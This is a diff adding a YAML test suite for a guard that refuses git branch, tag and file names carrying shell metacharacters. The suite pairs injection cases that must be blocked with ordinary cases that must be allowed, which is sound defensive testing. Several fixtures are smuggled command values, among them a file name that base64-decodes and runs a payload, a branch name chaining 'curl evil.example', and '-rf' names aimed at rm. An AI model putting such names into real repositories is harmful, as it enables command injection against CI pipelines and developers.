@@ -1,0 +1,327 @@
+suite:
+  id: refname-filename-metachar-tests-v1
+  policy_id: refname-filename-metachar
+  version_constraint: '>=0.1.0'
+  maintainer: chock-core
+  primary_metric: pass_rate
+  metrics:
+    pass_rate:
+      direction: higher_is_better
+      threshold: 1.0
+  # `command` cases replay the guard; `files` cases stage paths in a throwaway repository and run the script gate
+  # at commit (`writes` cases run it at tool use). The pre-push hook reads git's stdin and is proven in
+  # tests/policies/test_refname_filename_metachar.py. File-name fixtures avoid characters Windows cannot store;
+  # control characters, pipes and quotes in names are proven there too.
+  cases:
+  - id: tc-001
+    category: trigger
+    prompt: A change adds a file whose name carries command substitution that decodes and runs a payload.
+    expect: 'The commit is refused: a name a CI loop echoes unquoted would run the substitution.'
+    execute:
+      files:
+        "scripts/$(echo${IFS}aWQK${IFS}base64${IFS}-d).sh": "echo ok\n"
+      event: commit
+      expect: block
+  - id: tc-002
+    category: trigger
+    prompt: An agent creates a branch whose name carries an IFS expansion.
+    expect: The guard refuses the branch name.
+    execute:
+      command: git checkout -b 'feat/x${IFS}&&${IFS}curl${IFS}evil.example'
+      expect: block
+  - id: tc-003
+    category: trigger
+    prompt: A change adds a file whose name starts with a dash.
+    expect: 'The commit is refused: `rm *` or `tar *` in that directory would read it as an option.'
+    execute:
+      files:
+        "scripts/-rf": "x\n"
+      event: commit
+      expect: block
+  - id: tc-004
+    category: negative_trigger
+    prompt: A change adds ordinary source files.
+    expect: The commit is allowed.
+    execute:
+      files:
+        src/app/main.py: "print('ok')\n"
+        docs/guide-v2.md: "# Guide\n"
+      event: commit
+      expect: allow
+  - id: tc-005
+    category: negative_trigger
+    prompt: A change adds a file with spaces inside its name.
+    expect: The commit is allowed; a space inside a name is not refused.
+    execute:
+      files:
+        notes/meeting notes 2026.md: "- item\n"
+      event: commit
+      expect: allow
+  - id: tc-006
+    category: trigger
+    prompt: An agent pushes HEAD to a branch named like a full commit id.
+    expect: 'The guard refuses: a ref with that shape shadows the commit it names.'
+    execute:
+      command: git push origin HEAD:refs/heads/5c9350738729a2cf1c40f5851628384751cae484
+      expect: block
+  - id: tc-007
+    category: trigger
+    prompt: An agent tags a release with a full commit id as the tag name.
+    expect: The guard refuses the tag name.
+    execute:
+      command: git tag 5c9350738729a2cf1c40f5851628384751cae484
+      expect: block
+  - id: tc-008
+    category: negative_trigger
+    prompt: An agent creates a branch from a full commit id as its start point.
+    expect: The guard allows it; only the new name is judged, never the start point.
+    execute:
+      command: git branch fix/pin 5c9350738729a2cf1c40f5851628384751cae484
+      expect: allow
+  - id: tc-009
+    category: negative_trigger
+    prompt: An agent fetches a pinned commit by its id.
+    expect: The guard allows it; a fetch without a destination creates no ref.
+    execute:
+      command: git fetch origin 5c9350738729a2cf1c40f5851628384751cae484
+      expect: allow
+  - id: tc-010
+    category: trigger
+    prompt: An agent switches to a new branch whose name holds a semicolon.
+    expect: The guard refuses the branch name.
+    execute:
+      command: git switch -c 'fix;id'
+      expect: block
+  - id: tc-011
+    category: adversarial
+    prompt: The branch name is glued to the -b flag inside an option cluster.
+    expect: The guard refuses; a cluster is read the way git reads it.
+    execute:
+      command: git checkout -tb'x`id`'
+      expect: block
+  - id: tc-012
+    category: adversarial
+    prompt: The create option is an abbreviated long option.
+    expect: The guard refuses; git accepts an unambiguous prefix and so does the guard.
+    execute:
+      command: git switch --cre 'a;b'
+      expect: block
+  - id: tc-013
+    category: adversarial
+    prompt: A tag message is glued to -m and starts with n, which must not read as the list flag.
+    expect: The guard refuses the tag name; the value ends the option cluster.
+    execute:
+      command: git tag -mnote 'v1;id'
+      expect: block
+  - id: tc-014
+    category: adversarial
+    prompt: A branch is renamed into a name starting with a dash, after --.
+    expect: The guard refuses the new name of a rename.
+    execute:
+      command: git branch -m old -- -x
+      expect: block
+  - id: tc-015
+    category: adversarial
+    prompt: The branch is created behind bash -c and a cd chain.
+    expect: The guard refuses; wrapped commands are read.
+    execute:
+      command: cd repo && bash -c "git branch 'x;id'"
+      expect: block
+  - id: tc-016
+    category: trigger
+    prompt: An agent redirects output into a file named with a semicolon.
+    expect: The guard refuses the file name.
+    execute:
+      command: echo hi > 'out;id'
+      expect: block
+  - id: tc-017
+    category: trigger
+    prompt: An agent touches a file whose name starts with a dash, after --.
+    expect: The guard refuses the file name.
+    execute:
+      command: touch -- -rf
+      expect: block
+  - id: tc-018
+    category: negative_trigger
+    prompt: An agent creates a branch from a shell variable.
+    expect: The guard allows it; the shell expands the variable, and pre-push judges the expanded name.
+    execute:
+      command: git checkout -b "feat/${TICKET}"
+      expect: allow
+  - id: tc-019
+    category: negative_trigger
+    prompt: An agent deletes a branch whose name is already bad.
+    expect: The guard allows it; deleting a bad name is cleanup.
+    execute:
+      command: git branch -D 'old;bad'
+      expect: allow
+  - id: tc-020
+    category: negative_trigger
+    prompt: An agent copies into a parent directory and removes a build directory.
+    expect: The guard allows both; '..' navigation and flags are not names.
+    execute:
+      command: cp a.txt ../b.txt && rm -rf build
+      expect: allow
+  - id: tc-021
+    category: negative_trigger
+    prompt: A commit message mentions substitution syntax and a semicolon.
+    expect: The guard allows it; a message is not a name.
+    execute:
+      command: "git commit -m 'fix: quote $(x); add test'"
+      expect: allow
+  - id: tc-022
+    category: negative_trigger
+    prompt: An agent lists branches matching a pattern with a semicolon.
+    expect: The guard allows it; listing creates nothing.
+    execute:
+      command: git branch --list 'a;b'
+      expect: allow
+  - id: tc-023
+    category: adversarial
+    prompt: A change renames a tracked file into a name with a backtick.
+    expect: The commit is refused; the new path has no baseline.
+    execute:
+      head_files:
+        tools/sync.sh: "echo ok\n"
+      files:
+        tools/sync`id`.sh: "echo ok\n"
+      event: commit
+      expect: block
+  - id: tc-024
+    category: behavior
+    prompt: A file whose bad name is already tracked is edited.
+    expect: The commit is allowed; only a path the change adds or renames into is judged.
+    execute:
+      head_files:
+        "legacy;name.txt": "old\n"
+      files:
+        "legacy;name.txt": "new\n"
+      event: commit
+      expect: allow
+  - id: tc-025
+    category: trigger
+    prompt: An agent writes a file whose name has a trailing dot.
+    expect: The write is refused at tool use.
+    execute:
+      writes:
+        "config.": "x = 1\n"
+      event: tool_use
+      expect: block
+  - id: tc-026
+    category: negative_trigger
+    prompt: An agent writes an ordinary file.
+    expect: The write is allowed at tool use.
+    execute:
+      writes:
+        src/util.py: "x = 1\n"
+      event: tool_use
+      expect: allow
+  - id: tc-027
+    category: trigger
+    prompt: An agent updates a ref named like a full commit id with update-ref.
+    expect: The guard refuses the ref name.
+    execute:
+      command: git update-ref refs/heads/5c9350738729a2cf1c40f5851628384751cae484 HEAD
+      expect: block
+  - id: tc-028
+    category: trigger
+    prompt: An agent adds a worktree on a new branch whose name starts with a dash.
+    expect: The guard refuses the branch name.
+    execute:
+      command: git worktree add -b -x ../wt
+      expect: block
+  - id: tc-029
+    category: negative_trigger
+    prompt: An agent pushes a feature branch and opens a worktree on a plain name.
+    expect: The guard allows both.
+    execute:
+      command: git push -u origin feature/np26 && git worktree add -b fix/x ../wt origin/main
+      expect: allow
+  - id: tc-030
+    category: trigger
+    prompt: A change adds a file under a directory whose name is a base64-decode shape.
+    expect: The commit is refused.
+    execute:
+      files:
+        "data/base64 -d/x.txt": "x\n"
+      event: commit
+      expect: block
+  - id: tc-031
+    category: adversarial
+    prompt: The branch name is written with ANSI-C quoting so the semicolon never appears in the command.
+    expect: The guard decodes the quoting as bash does and refuses the name.
+    execute:
+      command: git checkout -b $'fix\x3bid'
+      expect: block
+  - id: tc-032
+    category: adversarial
+    prompt: Substitution syntax is spliced from quoted pieces so no single quoted span holds it.
+    expect: The guard refuses; the name bash creates holds the substitution literally.
+    execute:
+      command: git checkout -b "a$"'(id)'
+      expect: block
+  - id: tc-033
+    category: adversarial
+    prompt: A verbose flag precedes the new branch name, which git still creates.
+    expect: The guard refuses; -v does not put git branch into list mode.
+    execute:
+      command: git branch -v 'x;id'
+      expect: block
+  - id: tc-034
+    category: negative_trigger
+    prompt: An agent renames an existing badly named file to a plain name.
+    expect: The guard allows it; only the destination of a move is a name being created.
+    execute:
+      command: git mv 'old;name.txt' old-name.txt
+      expect: allow
+  - id: tc-035
+    category: negative_trigger
+    prompt: A single-quoted awk program uses a dollar-paren field while output goes to a path built from a variable.
+    expect: The guard allows it; the variable is expanded by the shell and the awk text is not a name.
+    execute:
+      command: awk '{print $(NF-1)}' in.txt > "${OUT}/col.txt"
+      expect: allow
+  - id: tc-036
+    category: adversarial
+    prompt: A worktree is added at a path whose last segment becomes the new branch name.
+    expect: The guard refuses; git names the branch after the path.
+    execute:
+      command: git worktree add 'wt/x;id'
+      expect: block
+  - id: tc-037
+    category: negative_trigger
+    prompt: A change adds a JavaScript module named after the decode function it implements.
+    expect: The commit is allowed; a module name is not a decode command.
+    execute:
+      files:
+        lib/base64-decode.js: "module.exports = {};\n"
+      event: commit
+      expect: allow
+  - id: tc-038
+    category: adversarial
+    prompt: A heredoc body holding an apostrophe comes before a branch name with an IFS expansion.
+    expect: The guard refuses; heredoc bodies do not change quote state.
+    execute:
+      command: "cat <<EOF > notes.md\nit's done\nEOF\ngit checkout -b 'pwn${IFS}x'"
+      expect: block
+  - id: tc-039
+    category: adversarial
+    prompt: An unquoted command substitution is glued to a quoted name holding a semicolon.
+    expect: The guard refuses; the substitution is one expanded piece and the quoted text is still judged.
+    execute:
+      command: git checkout -b $(true)'fix;id'
+      expect: block
+  - id: tc-040
+    category: negative_trigger
+    prompt: A bash -c script copies into a directory named by a variable, after a heredoc with an apostrophe.
+    expect: The guard allows it; the inner script's expansions are marked like the outer line's.
+    execute:
+      command: "cat <<EOF > notes.md\ndon't panic\nEOF\nbash -c 'cp a.txt \"${DEST}/\"'"
+      expect: allow
+  - id: tc-041
+    category: adversarial
+    prompt: A command redirects both streams to a file with the bash `>&` form, naming the file with a semicolon.
+    expect: The guard refuses; `>&name` writes a file unless the word is a descriptor.
+    execute:
+      command: "make >& 'build;log'"
+      expect: block
